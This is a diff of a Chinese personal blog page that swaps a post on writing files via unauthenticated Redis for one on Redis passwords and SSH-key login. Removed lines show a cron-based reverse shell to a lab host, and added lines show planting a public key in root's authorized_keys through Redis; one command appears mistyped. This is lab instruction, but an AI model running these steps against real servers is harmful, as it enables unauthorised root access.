@@ -4,17 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="redis写文件, Broken-year">
-    <meta name="description" content="redis数据库写入文件
-计划任务反弹shell（ubuntu不能，centos）
+    <meta name="keywords" content="redis-keys, Broken-year">
+    <meta name="description" content="redis和秘钥登录ubuntu
+redis的未授权访问是很危险的，需要打开密码功能
 
+cd /etc/redis   //进入redis
+nano redis.conf   //打开配置文件
 
-写入一句话木马
-
-&amp;#x3D;&amp;#x3D;在kali里面测试&amp;#x3D;&amp;#x3D;
-打开redis数据库
-keys *
-set haha &#34;\n\n ">
+在配置文件中加入
+requirepass h">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +24,7 @@ set haha &#34;\n\n ">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>redis写文件 | Broken-year</title>
+    <title>redis-keys | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -318,12 +316,12 @@ set haha &#34;\n\n ">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">redis写文件</h1>
+                    <h1 class="description center-align post-title">redis-keys</h1>
                 </div>
             </div>
         </div>
@@ -463,14 +461,6 @@ set haha &#34;\n\n ">
                                 <span class="chip bg-color">redis</span>
                             </a>
                         
-                            <a href="/tags/Linux/">
-                                <span class="chip bg-color">Linux</span>
-                            </a>
-                        
-                            <a href="/tags/CentOS/">
-                                <span class="chip bg-color">CentOS</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -513,51 +503,48 @@ set haha &#34;\n\n ">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="redis数据库写入文件"><a href="#redis数据库写入文件" class="headerlink" title="redis数据库写入文件"></a>redis数据库写入文件</h1><blockquote>
-<p>计划任务反弹shell（ubuntu不能，centos）</p>
+                <h1 id="redis和秘钥登录"><a href="#redis和秘钥登录" class="headerlink" title="redis和秘钥登录"></a>redis和秘钥登录</h1><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><blockquote>
+<p>redis的未授权访问是很危险的，需要打开密码功能</p>
 </blockquote>
-<blockquote>
-<p>写入一句话木马</p>
-</blockquote>
-<p>&#x3D;&#x3D;在kali里面测试&#x3D;&#x3D;</p>
-<pre class=" language-redis"><code class="language-redis">打开redis数据库
-keys *
-set haha "\n\n * * * * bash -i >& /dev/tcp/192.168.3.134/9999 0>&1\n\n"
-get haha
+<pre class=" language-Linux"><code class="language-Linux">cd /etc/redis   //进入redis
+nano redis.conf   //打开配置文件
+</code></pre>
+<p>在配置文件中加入</p>
+<pre class=" language-redis"><code class="language-redis">requirepass haha123      //自己写个密码，比如haha123
+</code></pre>
+<p>然后重启服务</p>
+<pre class=" language-Linux"><code class="language-Linux">redis-server /etc/redis/
+redis-cli -h 192.168.3.135
+进入后
+auth haha123    //输入密码
 </code></pre>
 <blockquote>
-<p>另起一个窗口，先测试命令是否有问题</p>
+<p>添加ssh</p>
 </blockquote>
-<p>&#x3D;&#x3D;kali&#x3D;&#x3D;</p>
-<pre class=" language-Linux"><code class="language-Linux">nc -nlvp 9999
+<pre class=" language-Linux"><code class="language-Linux">ssh-keygen -t rsa
 </code></pre>
-<p>&#x3D;&#x3D;ubuntu&#x3D;&#x3D;</p>
-<pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/9999 0>&1
+<h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre class=" language-Linux"><code class="language-Linux">redis-cli -h 192.168.3.135 -a haha123  //登录
+</code></pre>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><blockquote>
+<p>在kali命令行中输入</p>
+</blockquote>
+<pre class=" language-Linux"><code class="language-Linux">ssh-keygen -t rsa
+cd .ssh
+(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > key.txt
+cat key.txt | redis-cli -h 192.168.3.135 -a haha123 -x set xxx
 </code></pre>
 <blockquote>
-<p>可以连接上，命令无问题</p>
+<p>进入redis数据库</p>
 </blockquote>
-<p>&#x3D;&#x3D;kali&#x3D;&#x3D;</p>
-<pre class=" language-redis"><code class="language-redis">打开redis数据库
-config set dir /var/spool/cron/
-config set dbfilename root
+<pre class=" language-redis"><code class="language-redis">config set dir /root/.ssh
+config set dbfilename authorized_keys
 save
 </code></pre>
-<p>&#x3D;&#x3D;ubuntu&#x3D;&#x3D;</p>
-<pre class=" language-Linux"><code class="language-Linux">cd/var/spool/cron/
-cat root
-可以查看到root里是写入的重定向
-</code></pre>
 <blockquote>
-<p>计划任务地点</p>
+<p>然后就可以通过在kali端ssh免密码登录</p>
 </blockquote>
-<pre class=" language-Linux"><code class="language-Linux">/etc/crontab
-/etc/cron.d/
-/var/spool/cron/crontabs/
+<pre class=" language-Linux"><code class="language-Linux">sh -i id_rsa root@192.168.3.135
 </code></pre>
-<blockquote>
-<p>ubuntu中计划任务出现乱码会不执行，但是centos会忽略乱码，所以可以执行</p>
-</blockquote>
 
                 
             </div>
@@ -584,7 +571,7 @@ cat root
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/19/redis-file/">http://Broken-year.github.io/2022/03/19/redis-file/</a>
+                    <a href="http://Broken-year.github.io/2022/03/19/redis-keys/">http://Broken-year.github.io/2022/03/19/redis-keys/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -644,14 +631,6 @@ cat root
                             
                                 <a href="/tags/redis/">
                                     <span class="chip bg-color">redis</span>
-                                </a>
-                            
-                                <a href="/tags/Linux/">
-                                    <span class="chip bg-color">Linux</span>
-                                </a>
-                            
-                                <a href="/tags/CentOS/">
-                                    <span class="chip bg-color">CentOS</span>
                                 </a>
                             
                         </div>
@@ -825,9 +804,10 @@ cat root
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/19/redis-keys/">
                     <div class="card-image">
@@ -845,9 +825,9 @@ cat root
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -860,6 +840,7 @@ cat root
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -898,13 +879,13 @@ cat root
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/18/redis-deploy/">
+                <a href="/2022/03/19/redis-file/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Redis部署">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="redis写文件">
                         
-                        <span class="card-title">Redis部署</span>
+                        <span class="card-title">redis写文件</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -915,7 +896,7 @@ cat root
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
                             </span>
                         <span class="publish-author">
                             
@@ -954,6 +935,14 @@ cat root
                     
                     <a href="/tags/redis/">
                         <span class="chip bg-color">redis</span>
+                    </a>
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/CentOS/">
+                        <span class="chip bg-color">CentOS</span>
                     </a>
                     
                 </div>
